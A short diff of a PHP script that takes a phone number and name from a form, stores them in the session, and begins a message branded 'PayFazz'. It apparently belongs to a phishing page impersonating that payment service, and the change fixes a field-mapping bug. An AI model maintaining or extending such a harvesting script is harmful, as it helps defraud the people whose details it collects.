@@ -6,7 +6,7 @@ $nohp = $_POST['nohp'];
 $nama = $_POST['nama'];
 
 $_SESSION['nohp'] = $nohp;
-$_SESSION['nama'] = $nohp;
+$_SESSION['nama'] = $nama;
 
 $message = "
 ( PayFazz | Semangat ❤️ )
